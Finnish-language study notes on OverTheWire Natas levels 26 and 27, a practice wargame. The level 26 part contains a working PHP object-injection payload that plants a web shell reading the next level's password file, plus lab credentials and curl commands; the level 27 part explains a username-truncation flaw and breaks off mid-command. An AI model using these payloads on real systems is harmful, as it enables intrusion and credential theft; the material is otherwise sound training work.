---

# natas 26 - START HERE;

password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

X1 , Y1, X2 ja Y2 lomakekenttä tyyppinen ja sitten DRAW? 

Funktio lukee ja tallentaa x1, y1, x2, y2 arvot yhteen objektiin, mutta ei tee suoraa täsmennystä niiden välillä.

```
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>
```


Testasin jotakin satunnaista, että ainakin antoi tällaisen warning ilmoituksensa

**Warning: imageline() expects parameter 2 to be int, string given in /var/www/natas/natas26/index.php on line 80** - ja tämä voi olla koskien tiedoston polkun hakemistoa eli */var/www/natas/natas26/index.php*



## Pientä pohdintaa ja koodin tarkistamisesta - START HERE

Tässä siis ideana X1, X2 ja Y1 , Y2 lähettää pari viivjoen piirtämistä. Jokainen uusi pari lisätään edelisiin viivoihin. 

Kokeilin aluks 3 , 5 , 7 ja 11 - josta ainakin tuli pieni viiva , sitten toisen kerran testasin 50, 70, 80 ja 100 ,josta ainakin piirsi toisen viivan - ja voi olla joka kerta piirtää omansa uuden viivan erikseen.


Tässä ainakin session start siis istunnon alkamisessa on if-else koskien tuota virallisesta natas26 harjoituksen evästettä. Käyttäjän piirtotiedot tallennetaan evästeeseen ja haetaan sieltä seuraavilla sivulatauksilla. Käyttämällä session_id() kuva tallennetaan jokaiselle käyttäjälle erikseen → tosi fiksu tapa tehdä henkilökohtaisia piirroksia.

Evästeeseen tallennetaan useita piirto-objekteja, joista kukin on yksi viiva kahden pisteen välillä. Tämä mahdollistaa monivaiheisen piirtämisen. Tallentaa käyttäjän syöttämät koordinaatit evästeeseen uudeksi piirto-objektiksi.

tiivistettynä: Jos käyttäjällä on "drawing"-eväste tai antaa 4 koordinaattiarvoa URL:iin, koodi piirtää kuvan, näyttää sen ja tallentaa datan tiedostoon, joka perustuu istunnon tunnukseen.

```
<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```


Seuraavaksi nyt alemmassa tapahtuu `drawImage()` ja `showImage()` nin tämä on simppelisti tarkistaa ykinkertaisesti tiedostonnimen olemassaolon. drawImage - tarkoittaa luo laatikonsa ja kutsuu sitten `drawFromUserData` funktiota enenn PNG-kuvan luomista tiedostosta.


```
    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

```


`drawFromUserData` - funktio osuus.

Jos x1, y1, x2, ja y2 -avaimet löytyvät POST- tai GET-pyynnöstä, koodi piirtää viivan niiden välillä ja tallentaa sen session pohjalta nimettyyn kuvaan.

Jos käyttäjän evästeessä (cookie) on avain drawing, koodi purkaa sen (unserialize) ja käyttää evästeessä olevia koordinaatteja (x1, y1, x2, y2) viivan piirtämiseen.

Molemmat tavat johtavat siihen, että koodi rakentaa kuvan polun session ID:n mukaan, sitten kutsuu drawImage(), showImage() ja storeData().

💡 Tämä tarkoittaa, että väärin muotoiltu tai manipuloitu "drawing"-eväste voi johtaa unserialize-haavoittuvuuteen, jos sisältö ei ole odotettua. Siksi evästeen sisältö kannattaa tutkia tarkasti.


```
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }
```


seuraavaksi `storeData()` funktio osuus, jossa tämä funktio on se kuinka `POST` data tekee sen `$_COOKIE` vaihtelevaksi muuttujaksi.

Kun taulukon avaimet x1, y1, x2, ja y2 ovat saatavilla (esimerkiksi POST-data), niistä luodaan uusi olio ($new_object), joka kuvaa yhtä viivaa.

Jos käyttäjän evästeessä on jo olemassa drawing-arvo, se puretaan (unserialize) ja tallennetaan muuttujaan $drawing. Tämä sisältää aiemmat viivat.

Purettua $drawing-taulukkoa päivitetään lisäämällä uusi $new_object siihen — eli yhdistetään vanhoja ja uusia viivoja yhteen.

Näin voidaan rakentaa moniosainen viiva tai useamman segmentin kokonaisuus, joka tallentuu $drawing-muuttujaan.

🧠 Tämä mahdollistaa sen, että käyttäjä voi piirtää useita viivoja, ja eväste säilyttää koko sarjan viivoja yksittäisen muuttujan kautta.

```
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
```


Viimeisenä luokkitus **The Logger Class**.

Tämä Logger-luokka on rakennettu kirjoittamaan lokitiedosto `/tmp`-hakemistoon, käyttäen tiedostonimeä, joka perustuu parametrina annettuun `$file`-arvoon.

Olio toimii myös destruktorin kautta – tämä on juuri se, mitä hyödynnetään serialisointihaavoittuvuudessa.

💥 Haavoittuvuus: Koska luokka sisältää __destruct-menetelmän ja tallentaa tiedostonimen parametrina ilman kunnollista validointia, se voi olla altis PHP object deserialization -hyökkäykselle. Jos käyttäjä pystyy unserialize()-toiminnolla syöttämään räätälöidyn Logger-olion, se voi johtaa ei-toivottuun tiedoston kirjoitukseen tai jopa tiedoston korvaamiseen.

**Luokan toiminta:**

- `__construct()`: avaa lokitiedoston ja kirjoittaa "#--session started--#" 
- `log($msg)`: lisää rivin tiedostoon
- `__destruct()`: kirjoittaa "#--session end--#" kun olio tuhotaan


```
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }
```

## Haavoittuvuus 

Tässä natas26 levelissä on **PHP object deserialization vulnerability** eli PHP -olion purkuun liittyvä haavoittuvuus.


- object deserialization: haavoittuvuuden osa - ei tarkistusta evässteen `unserialize()`- kohdassa ja hyödynnettävä osa: `Logger` luokan destruktori.
- Arbitrary file write: haavoittuvuuden osa - kirjoittaa tiedostoon käyttäjä ohjaamana ja hyödynnettävä osa: `$logFile`- polku.


Eli sivusto käyttää PHP:n unserialize()-toimintoa purkaakseen käyttäjän evästeestä tulevan datan – ja se tekee sen **ilman mitään tarkistusta**. Käyttäjä saa siis antaa suoraan olion, ja kun se puretaan, PHP voi suorittaa olion sisällä olevia "taikametodeja", kuten `__destruct()`.


Ja nyt se juttu: sivustolla on valmiiksi käytössä luokka nimeltä Logger, jossa on tämä `__destruct()`-metodi, joka kirjoittaa tiedoston palvelimelle. Käyttäjä pystyy ohjaamaan:

- minne tiedosto tallennetaan
- mitä tiedoston sisältöön kirjoitetaan (esim. PHP-koodia)

Eli haavoittuvuus syntyy siitä, että käyttäjä voi: ➡️ lähettää omaa koodia evästeen kautta ➡️ saada sen purettua oliona palvelimella ➡️ ja pakottaa palvelimen kirjoittamaan oman tiedoston, joka voidaan suorittaa myöhemmin

Kun tähän liitetään esimerkiksi PHP-koodi, joka hakee salasanan seuraavalle tasolle, niin… 💥 pääset eteenpäin. Sama pätee tässä istunnossa, kun eväste kirjauttumisessa tietty aika (sekunti/minuutti) josta se käyttäjätunnus;salasana potkii käyttäjänsä ulos ja joutuu kirjautuu uudestaan sisään - niin tästä se kuvio image on yhä tallella.

---

## Kali linux - START HERE

password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE


`curl -v http://natas26.natas.labs.overthewire.org/ --user natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`

```
┌──(kali㉿kali)-[~]
└─$ curl -v http://natas26.natas.labs.overthewire.org/ --user natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
* Host natas26.natas.labs.overthewire.org:80 was resolved.
* IPv6: (none)
* IPv4: 13.48.176.69
*   Trying 13.48.176.69:80...
* Connected to natas26.natas.labs.overthewire.org (13.48.176.69) port 80
* Server auth using Basic with user 'natas26'
> GET / HTTP/1.1
> Host: natas26.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyNjpjVlhYd3hNUzNZMjZuNVVaVTg5UWdwR21XQ2VsYVFsRQ==
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Tue, 29 Jul 2025 13:55:00 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Set-Cookie: PHPSESSID=1dq5hsvfjea9bu00206vpssjof; path=/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 1148
< Content-Type: text/html; charset=UTF-8
< 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas26", "pass": "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" };</script></head>
<body>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas26.natas.labs.overthewire.org left intact
```



PHPSESSION-VALUE.php, ja haluat base64-koodata sen sisällön, se onnistuu helposti Kali Linuxissa — tiedoston pääte .php ei estä mitään.

MALLI: `base64 PHPSESSION-VALUE.php`

tiedostoon: `base64 PHPSESSION-VALUE.php > encoded.txt`


🔓 Base64-dekoodaa takaisin:
`base64 --decode encoded.txt > decoded.php`



Jos haluat koodata vain tiedoston nimen (ei sisältöä),
Tämä antaa sinulle base64-version tiedostonimestä, ei sen sisällöstä:
`echo -n "1dq5hsvfjea9bu00206vpssjof.php" | base64`



PHPSESSID: g8hn7mhe42vm00c3cgqnbhqkgf

drawing: YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fX0%3D

```
┌──(kali㉿kali)-[~]
└─$ echo -n "YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fX0%3D" | base64
WVRveE9udHBPakE3WVRvME9udHpPakk2SW5neElqdHpPakk2SWpNeUlqdHpPakk2SW5reElqdHpP
akk2SWpVM0lqdHpPakk2SW5neUlqdHpPakk2SWpnNUlqdHpPakk2SW5reUlqdHpPak02SWpFeU15
STdmWDAlM0Q=
                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ php -r 'echo print_r(unserialize(base64_decode("YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fX0=")), true);'
Array
(
    [0] => Array
        (
            [x1] => 32
            [y1] => 57
            [x2] => 89
            [y2] => 123
        )

)
```


**tämä muuttaa sen takaisin** - eli ei hyötyä kauhesti.. että wtf
```
┌──(kali㉿kali)-[~]
└─$ php -r '$o = ["x1"=>"32", "y1"=>"57", "x2"=>"89", "y2"=>"123"]; print base64_encode(serialize($o))."\n";'
YTo0OntzOjI6IngxIjtzOjI6IjMyIjtzOjI6InkxIjtzOjI6IjU3IjtzOjI6IngyIjtzOjI6Ijg5IjtzOjI6InkyIjtzOjM6IjEyMyI7fQ==



curl http://natas26.natas.labs.overthewire.org/img/shell.php \
  --user "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
  --cookie "drawing=g8hn7mhe42vm00c3cgqnbhqkgf"


┌──(kali㉿kali)-[~]
└─$ curl http://natas26.natas.labs.overthewire.org/ \             
  --user "natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" \
  --cookie "drawing=g8hn7mhe42vm00c3cgqnbhqkgf"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas26", "pass": "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE" };</script></head>
<body>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<br />
<b>Notice</b>:  unserialize(): Error at offset 0 of 19 bytes in <b>/var/www/natas/natas26/index.php</b> on line <b>70</b><br />
<img src="img/natas26_rs3osgd2663cmb9c518rmq2goq.png"><br />
<b>Notice</b>:  unserialize(): Error at offset 0 of 19 bytes in <b>/var/www/natas/natas26/index.php</b> on line <b>98</b><br />

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


**PHP koodia vähäsen**:
```
┌──(kali㉿kali)-[~/Desktop/php-koodi]
└─$ cat logger1.php     
<?php
# this is for natas26 level
class Logger{
    private $logFile;
    private $exitMsg;

    function __construct(){
        $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/natas26_rs3osgd2663cmb9c518rmq2goq.php";
    }
}

$logger = new Logger();
echo base64_encode(serialize($logger));



┌──(kali㉿kali)-[~/Desktop/php-koodi]
└─$ php logger1.php      
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiaW1nL25hdGFzMjZfcnMzb3NnZDI2NjNjbWI5YzUxOHJtcTJnb3EucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MTk6IkFueXRoaW5nIGdvZXMgaGVyZQoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MzoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KIjt9
```                   


Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9yczNvc2dkMjY2M2NtYjljNTE4cm1xMmdvcS5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=                    


Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl81ODlrMnZlcWlhZW9mZGx1bmo1cG44dnFycC5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30= 




https://learnhacking.io/overthewire-natas-level-26-walkthrough/

https://n0j.github.io/2017/07/19/otw-natas-26.html

https://medium.com/hacker-toolbelt/natas-26-php-object-injection-88134728fd18

https://ivanitlearning.wordpress.com/2020/02/02/overthewire-natas2224-26-more-php-fun/


---

# natas27 - START HERE;

natas27 ; u3RRffXjysjgwFU6b9xa23i6prmUsYne 

syötin ainakin pari tunnusta mutta "admin:admin" sanoi : User admin was created!
kokeilin toista "testi.testi" - User testi was created!

syötin uudestaan (admin:admin) niin kirjautui sisään ja tuli tervetuloa - odotellaan n. 5 min (view-source mukaan) - pitäisi tyhjentää tietokannan - voiko se koskea näitä luoneita tunnuksia?

Eli periaatteessa tässä etusivun kirjautumisessa tapahtuu niin että joutuu luoda uuden tunnuksen ikään kuin (admin;admin) sitten pääsee kirjauttuu sisään ja tulee se tervetuloa admin. 5 min päästä se poistaa tämän luoneen tunnuksen tietokannasta ja huomoina tarkistettu se ei ainakaan tallenna evästeitä.


view-source.html:ssä on osa jotakin SQL komentoja koodattu tässä PHP funktoin määrityksen sisällä kuitenkin.



## koodin tarkistuksena - START HERE;

Eli käydään lävitse view-source.html:ssä mitä tässä koodissa oikein puhuttaan vaikka onkin SQL:ää tässä mainittu tosi osassa funktioiden alla.


Tässä , jos pyyntö sisältää käyttäjätunnus ja salasansa , kun lähetämme lomakkeen ja kuin täyttäisi uuden tunnuksensa.

```
if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>
```



Seuraavaksi, yhteys ottaa tietokantaansa ja ohjelma tarkastaa käytäjätunnuksensa kelvolliseksi käyttämällä tätä funktiota `validUser()`.

```
function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}
```


Jos mikäli tunnistetieto (käyttäjätunus ja salasnsa) nini tarkistettaan funktiossa `checkCredentials` alla.

```
function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}

```


seuraavaksi, jos tunnusket täsmää ja kelvollisia niin sitten kaikki tunnukset dumpataan eli `dumpData` funktiolla - eli kuin tyhjentää sen tunnuksen pois alta.

```
function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}

```


Viimeisenä jos ei , niin voi luoda uuden käyttäjäntunnuksens ja salasansa - jos ei ole olemassa mikäli on dumpattu/tyhjennetty tietokannan alta - `createUser` - funktio.

```
function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}

```


🔎 Tilannekuva

Nyt yritettään pitää saada tietoa käyttäjästä natas28, mutta ei tiedetä tiedä **natas28** salasanaansa. Suoraa SQL-injektiota ei voi tehdä, koska kaikki syötteet suojataan `mysql_real_escape_string()`-funktiolla. Tästä syystä perinteinen SQL-injektio ei onnistu.


💡 Vihjeet ja havaintoja
1. checkCredentials() tarkistaa käyttäjätunnuksen JA salasanan.
Eli jos syötät väärän salasanan, saat virheilmoituksen.

2. validUser() ja dumpData() tarkistavat VAIN käyttäjätunnuksen.
Eli kun joku käyttäjätunnus löytyy, niin voit saada sen tiedot näkyviin — vaikka salasana olisi väärä.

3. Taulussa ei ole määritelty käyttäjänimen ainutlaatuisuutta!
Usein username on asetettu UNIQUE, mutta tässä ei ole. Tämä on kriittinen.

4. Käyttäjänimen ja salasanan sarakkeet ovat VARCHAR(64)
Jos laitat yli 64 merkkiä pitkän merkkijonon, MySQL leikkaa ylimääräiset pois (ellei strict mode ole käytössä, mikä tässä oletetaan olevan pois päältä).



🎯 Hyökkäysidea: Hyödynnä käyttäjänimen leikkaantumista

Koska username-kenttä on VARCHAR(64) ja ei ole ainutkertainen, voit luoda uuden käyttäjänimen, joka alkaa samalla tavalla kuin natas28, mutta jatkuu ylimääräisillä merkeillä yli 64 merkkiä.


- Esim, käyttäjänimellä: `natas28AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`
- Salasana osuus: `natas28AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

Eli näissä molemmissa siis kun syötetään tietokantaan, MySQL **truncaa** (truncate table) sen 64 merkin kohdalla.

Jos tekisi  salasantarkistuksensa checkCredentials()-funktiolla, niin sinun syötteesi ei ole täsmälleen sama kuin tietokannassa oleva, joten salasanatarkistus epäonnistuu. Ei haittaa!

Kun taas käytät dumpData()-funktiota, joka hakee tietoja pelkän käyttäjänimen perusteella, niin jos teet uuden käyttäjän jolla on username = natas28 ja se tallentuu truncattuna samalla tavalla kuin oikea natas28, saatat osua oikean käyttäjän tietoihin — koska MySQL:n vertaillessa username-kenttää se näkee leikatun version.

- `mysql_real_escape_string()` - estää injektiot, mutta ei loogisia virheitä.
- Käyttämällä yli 64 merkkiä pitkää käyttäjänimeä, joka alkaa natas28, voit huijata järjestelmää dumpaamaan toisen käyttäjän tietoja.



## Kali linux - chekkausta

natas27 ; u3RRffXjysjgwFU6b9xa23i6prmUsYne 


Eli koodin tarkistuksensa ja tuosta päättyessä antoikin vihjeitä, mutta nyt testataan kali linux ympäristön vuoro tarkistaa tämän harjoitus level.


Kokeillaan sqlmap - että mitä se tarjoaa ja onkin pieni sql injektio osuus. Huomoina sqlmap ei pysty automaattisesti hyödyntämään tätä tiettyä haavoittuvuutta (looginen bugi, ei injektio), koska se ei ymmärrä tietokannan kenttärajojen aiheuttamia leikkauksia tai autentikoinnin logiikkaa. Tässä ei ole SQL-injektiota.




Tuloksesta ei antanut mitään mutta jotakin ainakin.. testastiin varmuuden vuoksi

┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas27.natas.labs.overthewire.org/" --auth-type=Basic --auth-cred="natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" --batch --risk=3 --level=5
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:26:14 /2025-08-08/

[19:26:16] [INFO] testing connection to the target URL
[19:26:16] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:26:17] [INFO] testing if the target URL content is stable
[19:26:17] [INFO] target URL content is stable
[19:26:17] [INFO] testing if parameter 'User-Agent' is dynamic
[19:26:17] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[19:26:17] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[19:26:17] [INFO] testing for SQL injection on parameter 'User-Agent'
......
.........
...........
[19:41:34] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:41:41] [INFO] testing 'Generic inline queries'
[19:41:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:41:56] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:42:10] [WARNING] parameter 'Host' does not seem to be injectable
[19:42:10] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:42:10] [WARNING] your sqlmap version is outdated

[*] ending @ 19:42:10 /2025-08-08/








┌──(kali㉿kali)-[~]
└─$ curl -I -H "Referer: http://natas28.natas.labs.overthewire.org/" -u "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" http://natas27.natas.labs.overthewire.org/
HTTP/1.1 200 OK
Date: Fri, 08 Aug 2025 16:44:43 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Type: text/html; charset=UTF-8



┌──(kali㉿kali)-[~]
└─$ curl -u natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne \
-d "username=test&password=test" \
http://natas27.natas.labs.overthewire.org/

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
User test was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>



Haettu netistä lisätietoa ja apua, mutta tämä on tekoälyn apua. Tämä komento lähettää POST pyynnön ja tekee sellaisen arvauksensa.

Sovellus ei tarkistanut onko "samanniminen" käyttäjä jo olemassa, koska käyttäjänimi ei ole UNIQUE. Koska se käyttää VARCHAR(64) kenttää, MySQL leikkaa käyttäjänimen automaattisesti 64 merkkiin. Tuloksena on toinen käyttäjä, jonka truncattu käyttäjänimi on täsmälleen natas28, eli täsmää olemassa olevaan oikeaan käyttäjään.

Lyhyesti sanottuna on logiikkavirhe, ei SQL injektio ja onkin hyödyntämistä käyttäytymistä.

1. Lähetit lomakkeeseen yli 64-merkkisen käyttäjänimen, joka alkaa natas28.
2. MySQL katkaisi nimen 64 merkkiin, jolloin siitä tuli vain natas28, sama kuin olemassa oleva käyttäjä.
3. Koska käyttäjänimet eivät ole uniikkeja, tietokantaan lisättiin toinen natas28.
4. Nyt voit kirjautua sisään omalla salasanallasi käyttäen nimeä natas28.
5. Sovellus näyttää sinulle tiedot (ja salasanan) oikealta natas28-käyttäjältä, koska se ei tarkista salasanaa kunnolla.


```
┌──(kali㉿kali)-[~]
└─$ curl -u natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne \
-d "username=natas28$(python3 -c 'print("A"*100)')" \
